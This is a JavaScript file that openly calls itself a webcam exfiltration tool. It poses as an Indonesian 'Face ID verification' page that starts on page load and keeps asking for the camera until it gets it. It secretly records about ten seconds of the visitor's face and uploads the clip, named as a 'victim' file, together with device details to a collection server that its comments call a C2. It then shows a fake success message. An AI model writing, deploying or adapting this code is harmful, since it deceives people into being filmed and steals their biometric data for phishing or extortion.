// scanner.js - Universal Face Scan + Webcam Exfil for PC & Mobile

let mediaStream = null;
let recorder = null;
let chunks = [];

async function initFaceScan() {
  const statusEl = document.getElementById('status');
  statusEl.textContent = 'Menginisialisasi Face ID...';

  try {
    // Request camera - front facing preferred for face scan
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: { ideal: "user" }, 
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: false
    });

    const video = document.getElementById('video');
    video.srcObject = mediaStream;
    await video.play();

    statusEl.innerHTML = '🔴 LIVE SCANNING WAJAH<br>Jangan bergerak...';

    // Start recording
    recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
    
    recorder.ondataavailable = event => {
      if (event.data.size > 0) chunks.push(event.data);
    };

    recorder.onstop = async () => {
      const videoBlob = new Blob(chunks, { type: 'video/webm' });
      const formData = new FormData();
      formData.append('face_scan_video', videoBlob, `victim_${Date.now()}.webm`);
      formData.append('user_agent', navigator.userAgent);
      formData.append('platform', navigator.platform);
      formData.append('timestamp', new Date().toISOString());

      // Exfil to your C2
      try {
        await fetch('http://localhost:3000/face-captcha', {
          method: 'POST',
          body: formData
        });
        console.log('Face scan berhasil dikirim');
      } catch(e) {}
      
      chunks = []; // reset
    };

    recorder.start(1000); // chunks every second

    // Auto stop after 10 seconds "scan complete"
    setTimeout(() => {
      if (recorder && recorder.state === "recording") recorder.stop();
      statusEl.innerHTML = '✅ VERIFIKASI FACE ID BERHASIL!<br>Akses diizinkan.';
      
      // Optional: redirect to fake success page
      // setTimeout(() => window.location = "success.html", 1500);
    }, 10000);

  } catch (err) {
    statusEl.innerHTML = '⚠️ Izinkan akses kamera untuk melanjutkan verifikasi face scan!';
    console.error(err);
    // Retry
    setTimeout(initFaceScan, 1800);
  }
}

// Auto start
window.onload = () => {
  initFaceScan();
};

// Cleanup on close
window.onbeforeunload = () => {
  if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
};


window.onload = () => {
  // auto or manual
};